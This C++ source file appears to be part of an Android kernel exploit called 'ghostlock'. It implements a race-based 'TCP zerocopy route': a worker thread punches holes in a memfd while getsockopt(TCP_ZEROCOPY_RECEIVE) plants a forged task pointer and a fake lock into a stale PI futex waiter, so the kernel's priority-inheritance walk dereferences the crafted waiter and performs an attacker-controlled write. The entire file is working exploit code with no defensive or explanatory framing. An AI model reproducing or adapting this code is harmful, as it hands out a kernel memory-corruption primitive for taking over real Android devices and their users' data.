#include "route/tcp_zerocopy_route.h"

#include <sys/mman.h>

#if defined(__ANDROID__)
#include "common.h"
#include "route/route_lifecycle.hpp"

#include <linux/falloc.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <sys/socket.h>
#endif

#include <utility>

using namespace ghostlock;

namespace ghostlock::route::tcp_zerocopy {
    TcpZerocopyRoute::TcpZerocopyRoute(
        race::PiRace *race_context, const memory::WriteRequest *route_request,
        const profile::TargetProfile &profile_value,
        size_t mapping_length_value) noexcept
        : race(race_context),
          request(route_request),
          profile(profile_value),
          mapping_length(mapping_length_value) {
        /* C atomics cannot carry initializers in C++; mirror the old
   * tcp_zerocopy_route_context_init stores explicitly. */
        punch_go.store(0, std::memory_order_relaxed);
        punch_stop.store(0, std::memory_order_relaxed);
        punch_phase.store(0, std::memory_order_relaxed);
        punch_failed.store(0, std::memory_order_relaxed);
        status.code = ROUTE_RETRYABLE;
    }

    TcpZerocopyRoute::TcpZerocopyRoute(
        TcpZerocopyRoute &&other) noexcept
        : race(other.race),
          request(other.request),
          profile(other.profile),
          client_fd(std::move(other.client_fd)),
          server_fd(std::move(other.server_fd)),
          punch_fd(std::move(other.punch_fd)),
          mapping(std::move(other.mapping)),
          mapping_length(other.mapping_length),
          page_size(other.page_size),
          punch_worker(std::move(other.punch_worker)),
          route_won(other.route_won),
          status(other.status) {
        punch_go.store(other.punch_go.load(std::memory_order_relaxed),
                       std::memory_order_relaxed);
        punch_stop.store(other.punch_stop.load(std::memory_order_relaxed),
                         std::memory_order_relaxed);
        punch_phase.store(other.punch_phase.load(std::memory_order_relaxed),
                          std::memory_order_relaxed);
        punch_failed.store(other.punch_failed.load(std::memory_order_relaxed),
                           std::memory_order_relaxed);
    }

    int32_t TcpZerocopyRoute::fail(
        int32_t step, int32_t error_number) noexcept {
        status.step = step;
        status.error_number = error_number;
        return -1;
    }

    void TcpZerocopyRoute::disarm() noexcept {
        race->consumer_go.store(0);
        punch_go.store(0);
        punch_stop.store(1);
        while (race->consumer_inflight.load()) {
            __asm__ volatile (


            "yield"
            ::: "memory");
        }
        status.kernel_disarmed = 1;
    }

    void TcpZerocopyRoute::retain_for_process_lifetime() noexcept {
        (void) punch_fd.release_to_process_lifetime("tcp route dirty: puncher may run");
        (void) server_fd.release_to_process_lifetime("tcp route dirty: puncher may run");
        (void) client_fd.release_to_process_lifetime("tcp route dirty: puncher may run");
        (void) mapping.release();
        (void) punch_worker.release();
    }

    void TcpZerocopyRoute::destroy() noexcept {
        if (punch_worker.joinable()) {
            const int32_t join_error = punch_worker.join();
            if (join_error != 0) {
                (void) fail(47, join_error);
                status.code = ROUTE_DIRTY_FAILURE;
                retain_for_process_lifetime();
                return;
            }
        }
        if (mapping.valid()) {
            void *mapped = mapping.release();
            if (munmap(mapped, mapping_length) != 0) {
                const int32_t saved_errno = errno;
                (void) fail(48, saved_errno);
                status.code = ROUTE_DIRTY_FAILURE;
                retain_for_process_lifetime();
                return;
            }
            mapping = support::MappedRegion{};
        }
        punch_fd.reset();
        server_fd.reset();
        client_fd.reset();
        status.userspace_clean = 1;
        if (!route_won && status.kernel_disarmed) {
            status.code = ROUTE_FALLBACK_SAFE;
        }
    }
} // namespace ghostlock::route::tcp_zerocopy


#if defined(__ANDROID__)

namespace ghostlock::route {
        /* TCP zerocopy route: getsockopt(TCP_ZEROCOPY_RECEIVE) parks a frame whose
 * zc words overlap the stale waiter; zc[0x28] is waiter->task, zc[0x30]
 * waiter->lock. */
#define TCP_PUNCH_SHMEM_LEN (16 * 1024 * 1024)

    static void tcp_wait_for_consumer_idle(tcp_zerocopy::TcpZerocopyRoute *context) {
        context->race->consumer_go.store(0);
        while (context->race->consumer_inflight.load()) {
            __asm__ volatile (


            "yield"
            ::: "memory");
        }
    }

    static int32_t tcp_make_pair(tcp_zerocopy::TcpZerocopyRoute *context) {
        support::UniqueFd listener(socket(AF_INET, SOCK_STREAM | SOCK_CLOEXEC, 0));
        if (!listener.valid()) {
            return -1;
        }
        int32_t one = 1;
        setsockopt(listener.get(), SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));

        struct sockaddr_in addr;
        memset(&addr, 0, sizeof(addr));
        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
        addr.sin_port = 0;

        if (bind(listener.get(), (struct sockaddr *) &addr, sizeof(addr)) != 0 ||
            listen(listener.get(), 1) != 0) {
            return -1;
        }

        socklen_t addr_len = sizeof(addr);
        if (getsockname(listener.get(), (struct sockaddr *) &addr, &addr_len) != 0) {
            return -1;
        }

        context->client_fd.reset(socket(AF_INET, SOCK_STREAM | SOCK_CLOEXEC, 0));
        if (!context->client_fd.valid()) {
            return -1;
        }
        if (connect(context->client_fd.get(), (struct sockaddr *) &addr, sizeof(addr)) != 0) {
            context->client_fd.reset();
            return -1;
        }

        context->server_fd.reset(accept4(listener.get(), nullptr, nullptr, SOCK_CLOEXEC));
        if (!context->server_fd.valid()) {
            context->client_fd.reset();
            return -1;
        }
        return 0;
    }

    /* Repeatedly fill and punch the context-owned zerocopy backing memfd. Input:
 * tcp_zerocopy::TcpZerocopyRoute; output: context-owned phase/error flags. */
    static void *tcp_punch_thread(void *arg) {
        support::disable_rseq_for_thread();
        auto *context = static_cast<tcp_zerocopy::TcpZerocopyRoute *>(arg);
        while (!context->punch_go.load() &&
               !context->punch_stop.load()) {
            sched_yield();
        }
        while (!context->punch_stop.load()) {
            if (fallocate(context->punch_fd.get(), 0, 0, (off_t) context->mapping_length) != 0) {
                context->punch_failed.store(errno ? errno : EIO);
                pr_warning("tcp punch fill errno=%d\n", errno);
                break;
            }
            context->punch_phase.store(1);
            if (fallocate(context->punch_fd.get(),
                          FALLOC_FL_PUNCH_HOLE | FALLOC_FL_KEEP_SIZE,
                          (off_t) context->page_size,
                          (off_t)(context->mapping_length - context->page_size)) != 0) {
                /* without the hole the target page keeps stale contents and the
             * zerocopy write misses */
                context->punch_failed.store(errno ? errno : EIO);
                pr_warning("tcp punch hole errno=%d\n", errno);
            }
            context->punch_phase.store(0);
            if (context->punch_failed.load()) {
                break;
            }
        }
        return nullptr;
    }

    route::RouteStatus do_tcp_fake_lock_route(const memory::WriteRequest *request) {
        tcp_zerocopy::TcpZerocopyRoute context(
            &session::g_exploit_session.race, request, session::g_exploit_session.profile,
            TCP_PUNCH_SHMEM_LEN); // NOLINT(bugprone-implicit-widening-of-multiplication-result)
        const route::RouteStatus status = run_route_lifecycle(context);
        if (context.status.code == ROUTE_DIRTY_FAILURE &&
            context.status.step == 47) {
            pr_warning("tcp route punch join errno=%d; resources retained\n",
                       context.status.error_number);
        } else if (context.status.code == ROUTE_DIRTY_FAILURE &&
                   context.status.step == 48) {
            pr_warning("tcp route munmap errno=%d\n", context.status.error_number);
        }

        pr_info("tcp route done=%d calls=%d success=%d status=%d clean=%d/%d "
                "step=%d errno=%d\n",
                context.route_won,
                context.race->consumer_calls.load(),
                context.race->consumer_success.load(), context.status.code,
                context.status.userspace_clean, context.status.kernel_disarmed,
                context.status.step, context.status.error_number);
        return status;
    }
} // namespace ghostlock::route

namespace ghostlock::route::tcp_zerocopy {
    int32_t TcpZerocopyRoute::prepare() noexcept {
        if (!(session::g_exploit_session.heap.current.base) || !(session::g_exploit_session.heap.current.fake_lock) || !
            (session::g_exploit_session.
                heap.current.fake_fops)) {
            pr_warning("tcp route missing page=%016zx lock=%016zx fops=%016zx\n",
                       (session::g_exploit_session.heap.current.base),
                       (session::g_exploit_session.heap.current.fake_lock),
                       (session::g_exploit_session.heap.current.fake_fops));
            return fail(40, 0);
        }

        if (route::tcp_make_pair(this) != 0) {
            pr_warning("tcp route pair setup failed errno=%d\n", errno);
            return fail(41, errno);
        }

        page_size = (size_t) sysconf(_SC_PAGESIZE);
        punch_fd.reset(
            (int32_t) syscall(SYS_memfd_create, "ghostlock-tcp", MFD_CLOEXEC));
        if (!punch_fd.valid() ||
            fallocate(punch_fd.get(), 0, 0, (off_t) mapping_length) != 0) {
            pr_warning("tcp route memfd/fallocate errno=%d\n", errno);
            return fail(42, errno);
        }
        void *mapped = mmap(nullptr, mapping_length, PROT_READ | PROT_WRITE,
                            MAP_SHARED, punch_fd.get(), 0);
        if (mapped == MAP_FAILED) {
            pr_warning("tcp route mmap errno=%d\n", errno);
            return fail(43, errno);
        }
        mapping = support::MappedRegion(mapped, mapping_length);
        unsigned char *bytes = static_cast<unsigned char *>(mapping.data());
        for (size_t off = 0; off < mapping_length; off += page_size) {
            bytes[off] = 0x55;
        }

        race->consumer_stop.store(0);
        race->consumer_go.store(0);
        race->consumer_calls.store(0);
        race->consumer_success.store(0);
        int32_t thread_error = punch_worker.start(route::tcp_punch_thread, this);
        if (thread_error != 0) {
            pr_warning("tcp route punch thread errno=%d\n", thread_error);
            return fail(44, thread_error);
        }
        return 0;
    }

    /* Run the route after prepare has established exclusive resource ownership. */
    route::RouteStatus TcpZerocopyRoute::execute() noexcept {
        /* waiter->task carries init_task's phys alias, not the image address */
        uintptr_t waiter_task = ghostlock::profile::slide_init_task();
        uint32_t arm_seq = profile.tcp_arm_sequence();
        uint32_t post_hold =
                profile.tcp_post_receive_hold_iterations();
        uint32_t attempts = profile.tcp_attempts();

        pr_info("tcp route enter page=%016zx fake_lock=%016zx fake_w0=%016zx "
                "fake_task=%016zx task=%016zx attempts=%u arm=%u hold=%u\n",
                (session::g_exploit_session.heap.current.base), (session::g_exploit_session.heap.current.fake_lock),
                (session::g_exploit_session.heap.current.fake_w0), (session::g_exploit_session.heap.current.fake_task),
                waiter_task,
                attempts, arm_seq, post_hold);

        punch_go.store(1);
        /* custom-write mode: fire the PI walk immediately */
        race->route_delay_usec.store(0);

        std::array < unsigned char, 64 > sendbuf{};
        sendbuf.fill(0x33);

        for (int32_t i = 1; i <= attempts && !route_won; i++) {
            int32_t calls_before = race->consumer_calls.load();
            int32_t success_before = race->consumer_success.load();
            (void) send(server_fd.get(), sendbuf.data(), sendbuf.size(),
                        MSG_DONTWAIT);
            while (punch_phase.load()) {
                sched_yield();
            }
            for (int32_t spin = 0;
                 !punch_phase.load() &&
                 !punch_failed.load() &&
                 spin < 10000000;
                 spin++) {
                __asm__ volatile (


                "yield"
                ::: "memory");
            }
            if (punch_failed.load()) {
                (void) fail(46, punch_failed.load());
                pr_warning("tcp route puncher failed errno=%d\n",
                           status.error_number);
                break;
            }

            std::array < unsigned char, 0x40 > zc{};
            support::put64(zc.data(), 0x18,
                           (uint64_t)(uintptr_t)(static_cast<unsigned char *>(
                                                     mapping.data()) + page_size));
            support::put32(zc.data(), 0x20,
                           static_cast<uint32_t>(sendbuf.size()));
            support::put64(zc.data(), 0x28, waiter_task);
            support::put64(zc.data(), 0x30, (session::g_exploit_session.heap.current.fake_lock));

            socklen_t len = static_cast<socklen_t>(zc.size());
            errno = 0;
            int32_t ret = getsockopt(client_fd.get(), IPPROTO_TCP,
                                 TCP_ZEROCOPY_RECEIVE, zc.data(),
                                 &len);
            int32_t saved_errno = errno;
            /* release the consumer only once the zerocopy write landed in the
         * waiter frame; earlier release walks a half-written waiter */
            if (i >= arm_seq && ret == 0) {
                race->consumer_go.store(i);
                for (int32_t spin = 0; spin < post_hold; spin++) {
                    __asm__ volatile (


                    "yield"
                    ::: "memory");
                }
                route::tcp_wait_for_consumer_idle(this);
            }

            int32_t calls = race->consumer_calls.load();
            int32_t success = race->consumer_success.load();
            if (calls <= calls_before || success <= success_before) {
                if ((i % 100) == 0 || ret != 0) {
                    pr_info("tcp route seq=%d ret=%d errno=%d len=%u calls=%d "
                            "success=%d\n",
                            i, ret, saved_errno, len, calls, success);
                }
                continue;
            }
            /* consumer fired: the PI walk derefed the crafted waiter and wrote.
         * stages verify their own effects; no cfi stage here. */
            route_won = 1;
            status.code = ROUTE_OK;
            status.step = 0;
            status.error_number = 0;
        }
        if (!route_won && status.step == 0) {
            (void) fail(45, 0);
        }
        return status;
    }
} // namespace ghostlock::route::tcp_zerocopy
#endif // __ANDROID__

#if defined(__ANDROID__)
#include "route/exploit_procedure.hpp"

namespace {
    /* The TCP behavior lives in TcpPolicy (route_policy.hpp, capability
     * w3_exact_target); this binding keeps the per-route factory shape until
     * the pipeline composition slice replaces it. */
    class TcpProcedure final : public ghostlock::session::ExploitProcedure {
    public:
        explicit TcpProcedure(ghostlock::session::ExploitSession &session)
            : ExploitProcedure(session) {}
    };
} // namespace

namespace ghostlock::route {
    std::unique_ptr<ghostlock::session::ExploitProcedure> make_tcp_procedure(
        ghostlock::session::ExploitSession &session) {
        return std::make_unique<TcpProcedure>(session);
    }
} // namespace ghostlock::route
#endif // __ANDROID__
